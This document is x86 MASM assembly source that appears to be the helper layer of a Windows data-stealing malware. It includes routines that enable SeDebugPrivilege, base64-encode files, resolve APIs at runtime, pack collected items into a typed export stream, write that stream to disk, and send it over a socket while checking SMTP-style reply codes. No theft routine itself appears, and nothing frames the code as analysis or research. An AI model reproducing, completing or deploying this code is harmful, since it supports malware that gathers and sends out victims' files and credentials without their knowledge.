.data


MappedFile struct DWORD
	hFile           DWORD   ?
	hMap            DWORD   ?
	lpMem           DWORD   ?
	dwFileSize      DWORD   ?
MappedFile ends

.code


Recv_DataLF proc uses edi
        lea     edi, lpBuf1
        mov     ecx, lpRecvBufLen
@loop:
        jecxz   @err 

        push    ecx
	push    ecx
        invoke  recv, esi, edi, ecx, 0
        pop     ecx
pop     ecx

        
        cmp     eax, SOCKET_ERROR
        je      @err

        add     edi, eax 
        sub     ecx, eax 


        
        
        cmp     ecx, lpRecvBufLen
        jz      @test

        
        
        cmp     byte ptr[edi-1], 10
        je      @ok

@test:
        
        test    eax, eax        
        jz      @err

        jmp     @loop
@err:
        xor     eax, eax
        jmp     @end
@ok:    
        
        cmp     byte ptr [lpBuf1], '2'
        jz      @F
        cmp     dword ptr [lpBuf1], ' 453' 
        jnz     @err
@@:
        inc     eax 
        inc     edi
        mov     byte ptr[edi], 0 
	
@end:

        ret        
Recv_DataLF endp

Send_String proc lpStr: DWORD
        
        invoke  lstrlen, lpStr
        
        
        invoke  send, esi, lpStr, eax, 0
        ret
Send_String endp

IFNDEF X_HYWK
Privilegii proc
    local hTokenNew:HANDLE
    local tkpNew:TOKEN_PRIVILEGES
    invoke GetCurrentProcess
    mov ecx,eax
    invoke OpenProcessToken,ecx,TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,addr hTokenNew
    .if eax != 0
      invoke LookupPrivilegeValue,0,addr szSeDebug,addr tkpNew.Privileges.Luid
      .if eax != 0
        mov tkpNew.PrivilegeCount,1
        mov tkpNew.Privileges.Attributes,SE_PRIVILEGE_ENABLED
        invoke AdjustTokenPrivileges,hTokenNew,0,addr tkpNew,0,0,0
        .if eax != 0
          invoke GetLastError
          .if eax == ERROR_SUCCESS
            mov eax,1
          .else
            xor eax,eax
          .endif
        .endif
      .endif
      push eax
      invoke CloseHandle,hTokenNew
      pop eax
    .endif
    ret
	nop
	ret
Privilegii endp
ENDIF

Base64Encode proc uses esi edi ebx lpSrc, lpDst, dwSrcLen: DWORD
        mov     esi, lpSrc
        mov     edi, lpDst
        mov     ecx, dwSrcLen

        xor     ebx, ebx

@l:
        jecxz   @b64_ret

        lodsb
        shl     eax, 16
        cmp     ecx, 1
        jz      @work
        lodsb
        shl     ax, 8
        cmp     ecx, 2
        jz      @work
        lodsb

@work:
        ; Output b64 quad
        mov     edx, eax
        ror     edx, 24

        push    ecx
        push    4
        pop     ecx
@l2:
        call    @b64_write
        loop    @l2
        pop     ecx

        inc     ebx
        .IF     ebx == 18
                xor     ebx, ebx
                mov     ax, 0a0dh
                stosw
        .ENDIF

        sub     ecx, 3
        jns     @l

        ; Pad
        neg     ecx
        sub     edi, ecx
        mov     al, '='
        rep stosb

@b64_ret:
             ret
	nop
	ret

@b64_write:
        rol     edx, 6
        mov     eax, edx
        and     al, 00111111b
        cmp     al, 62
        jae     @write_spec

        cmp     al, 52
        jae     @write_number

        ; Uppercase
        add     al, 'A'
        cmp     al, 'A'+26
        jb      @write
        ; Lowercase
        add     al, 6
        jmp     @write
        ; Number
@write_number:
        add     al, '0'-52
        jmp     @write
        ; Special: +/
@write_spec:
        sub     al, 62
        shl     al, 2
        add     al, 43        
@write:
        stosb
                
        retn
Base64Encode endp

PayLoadDll proc uses ebx esi edi szLib, dwFuncs: DWORD
        invoke  LoadLibrary, szLib
        test    eax, eax
        jz      @plg_err

        mov     ebx, eax
        mov     edi, szLib
        mov     esi, dwFuncs
@l:
        cld
        xor     eax, eax
        or      ecx, -1
        repnz scasb                
        cmp     byte ptr[edi], 0
        jz      @e
        invoke  GetProcAddress, ebx, edi
        .IF     !eax
                ret
        .ENDIF
        mov     dword ptr[esi], eax
        add     esi, 4
        jmp     @l
@e:
        mov     eax, 1
@plg_err:
        ret
PayLoadDll endp

ZeroMemory proc uses edi lpMem, Len: DWORD
	cld
	mov     edi, lpMem
	mov     ecx, Len
	push	ecx	
	shr     ecx, 2
	xor     eax, eax
	rep stosd
	pop	ecx
	and     ecx, 3
	rep stosb
	ret
ZeroMemory endp


CompareMem proc uses esi edi lpSrc, lpDst, Len: DWORD
	cld
	mov	esi, lpSrc
	mov	ecx, Len
	mov	edi, lpDst
	xor	eax, eax
	repz cmpsb
	setz	al
	ret
CompareMem endp

MapFile proc uses ebx lpszFileName, lpMappedFile: DWORD
	mov     ebx, lpMappedFile
	assume  ebx: ptr MappedFile

	invoke  ZeroMemory, ebx, sizeof MappedFile

	invoke  CreateFile, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
	mov     [ebx].hFile, eax
	inc     eax
	jz      @mf_ret

	invoke  GetFileSize, eax, NULL
        mov     [ebx].dwFileSize, eax

        invoke  CreateFileMapping, [ebx].hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax
		mov     [ebx].hMap, eax
		invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
		mov     [ebx].lpMem, eax
        .ENDIF

@mf_ret:
        xor     eax, eax
        cmp     [ebx].lpMem, eax
        setnz   al

        assume  ebx: nothing
        ret
MapFile endp


UnmapFile proc uses ebx lpMappedFile: DWORD
	mov     ebx, lpMappedFile
	assume  ebx: ptr MappedFile

	.IF     [ebx].hFile != -1
		invoke  UnmapViewOfFile, [ebx].lpMem
		invoke  CloseHandle, [ebx].hMap
		invoke  CloseHandle, [ebx].hFile
	.ENDIF

	assume  ebx: nothing
        ret
UnmapFile endp



MyClearStr PROC StrClear : DWORD, Len : DWORD
push edi
mov ecx, Len
mov edi, StrClear
lll: mov byte ptr [edi],0
inc edi
loop lll
pop edi
ret
MyClearStr ENDP


GetIPAddr proc
invoke gethostname,offset IPbuff,sizeof IPbuff
invoke gethostbyname, offset IPbuff
mov eax,[eax + 12]
mov eax,[eax]
mov eax,[eax]
invoke inet_ntoa,eax
ret
GetIPAddr endp

IsOnline PROC
	invoke GetIPAddr
	invoke lstrcmp, eax, addr sz127001
	ret
IsOnline ENDP
	

DoLoadLib proc uses esi edi ebx szLibAndFuncs, lpFuncs: DWORD
	mov     edi, szLibAndFuncs
	mov	esi, lpFuncs

	invoke  LoadLibrary, edi
	test	eax, eax
	jz	@ret
	xchg	eax, ebx

@next:
	cld
	xor     eax, eax
	m2m	ecx, -1
	repnz scasb

	cmp     byte ptr[edi], 0
	jz      @ret_true

	invoke	GetProcAddress, ebx, edi
	mov	dword ptr[esi], eax
	test	eax, eax
	jz	@ret
	lodsd
	jmp	@next

@ret_true:
	mov	eax, TRUE

@ret:
        ret
DoLoadLib endp

ExportModule proc uses edi esi module: DWORD
	LOCAL	dwQWord: QWORD
	lea	edi, dwQWord
	mov	dword ptr[edi], 0
	mov	dword ptr[edi+4], 0
	.IF	dwPrevModuleOffset

		coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord


		mov	esi, dword ptr[edi]
		sub	esi, dwPrevModuleOffset


		m2m	dword ptr[edi], dwPrevModuleOffset
		coinvoke lpOutStream, IStream, Seek, dwQWord, S_BEGIN, addr dwQWord
		mov	dword ptr[edi], esi
		coinvoke lpOutStream, IStream, Write, edi, 4, NULL


		mov	dword ptr[edi], 0
		coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord
	.ENDIF


	coinvoke lpOutStream, IStream, Write, offset szModuleHeaderStart, 4, NULL

	coinvoke lpOutStream, IStream, Write, addr module, 4, NULL


	mov	dword ptr[edi], 0
	coinvoke lpOutStream, IStream, Seek, dwQWord, S_END, addr dwQWord
	m2m	dwPrevModuleOffset, dword ptr[edi]


	m2m	dword ptr[edi], 0
	coinvoke lpOutStream, IStream, Write, edi, 4, NULL
	ret
ExportModule endp


ExportData proc dtype, dsubtype, data, datalen: DWORD

	coinvoke lpOutStream, IStream, Write, addr dtype, 4, NULL

	coinvoke lpOutStream, IStream, Write, addr dsubtype, 4, NULL

	coinvoke lpOutStream, IStream, Write, addr datalen, 4, NULL

	coinvoke lpOutStream, IStream, Write, data, datalen, NULL
	ret
ExportData endp


ExportStr proc dtype, dsubtype, strdata: DWORD

	invoke  lstrlen, strdata

	invoke  ExportData, dtype, dsubtype, strdata, eax
	ret
ExportStr endp

b64_encode proc uses esi edi ebx lpSrc, lpDst, Len: DWORD
        mov     esi, lpSrc
        mov     edi, lpDst
        mov     ecx, Len

        xor     eax, eax
        xor     ebx, ebx

@gen:
        lodsb
        shl     eax, 8
        loop    @@2
        shl     eax, 8
        jmp     @@4
@@2:
        lodsb
        shl     eax, 8
        loop    @@3
        jmp     @@4
@@3:
        lodsb
        dec     ecx
@@4:
        push    ecx
        push    4
        pop     ecx
        push    ecx
@@:
        rol     edx, 8
        mov     dl, al
        and     dl, 00111111B
        shr     eax, 6
        loop    @B

        pop     ecx

@edx_conv:
        cmp     dl, 62
        jae     dl_62_63
        cmp     dl, 51
        ja      digit_0_9
        add     dl, 'A'
        cmp     dl, 'Z'
        jbe     @F
        add     dl, 'a'-'Z'-1
@@:
        jmp     rotate_edx
digit_0_9:
        add     dl, 30h-52
        jmp     rotate_edx
dl_62_63:
        sub     dl, 62
        shl     dl, 2
        add     dl, 43
rotate_edx:
        rol     edx, 8
        loop    @edx_conv

        xchg    eax, edx
        stosd
        xchg    eax, edx

        pop     ecx


        inc     ebx
        inc     ebx
        cmp     ebx, 24h
        jnz     @next
        xor     ebx, ebx
        mov     al, 0ah
        stosb
@next:
        or      ecx, ecx
        jnz     @gen

        ret
b64_encode ENDP

StreamToFile proc filename: DWORD
	LOCAL   hFile, lpRead: DWORD
	LOCAL   buf[128]: BYTE
	LOCAL   dwQWord: QWORD

	invoke  CreateFile, filename, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
	mov     hFile, eax
	inc     eax
	jz      @sstf_ret

	lea     edi, dwQWord
	xor	eax, eax
	stosd
	stosd
	coinvoke lpOutStream, IStream, Seek, dwQWord, S_BEGIN, NULL

@r:
	coinvoke lpOutStream, IStream, Read, addr buf, 128, addr lpRead
	invoke  WriteFile, hFile, addr buf, lpRead, addr lpRead, NULL
	cmp     lpRead, 0
	jnz     @r

	invoke  CloseHandle, hFile

@sstf_ret:
	ret
StreamToFile endp

SFCopyFromStr proc uses esi edi ebx lpStr: DWORD
        LOCAL   pData: DWORD

        invoke  lstrlen, lpStr
        mov     esi, eax

        invoke  SafeArrayCreateVector, VT_UI1, 0, esi
        mov     ebx, eax

        invoke  SafeArrayAccessData, ebx, addr pData
        .IF     SUCCEEDED
                mov     ecx, esi
              	mov     edi, pData
                mov     esi, lpStr

@cpy_loop:
                lodsb
                stosb
                dec     ecx
                jnz     @cpy_loop

                invoke  SafeArrayUnaccessData, ebx
        .ENDIF

        mov     eax, ebx

        ret
SFCopyFromStr endp


FileToBase64 proc uses ebx edi lpDestFileName, outMem, outLen: DWORD
        LOCAL   hFile, dwFileSize: DWORD

        xor     edi, edi

        invoke  CreateFile, lpDestFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error

        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close
	;invoke MessageBox, 0, dwFileSize, NULL, MB_OK
        invoke  CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
                .IF     eax
                        push    eax

                        mov     eax, dwFileSize

                        shl     eax, 1
                        invoke  GlobalAlloc, GPTR, eax
                        mov     edx, outMem
                        mov     [edx], eax
                        mov     edx, [esp]

                        invoke  Base64Encode, edx, eax, dwFileSize
                        mov     edx, outMem
                        invoke  lstrlen, [edx]


                        mov     edx, outLen
                        mov     [edx], eax

                        call    UnmapViewOfFile

                        inc     edi
                .ENDIF

                invoke  CloseHandle, ebx
        .ENDIF

@file_open_close:
        invoke  CloseHandle, hFile

@file_open_error:
        mov     eax, edi
        ret
	nop
	     ret
	nop
	ret
FileToBase64 endp

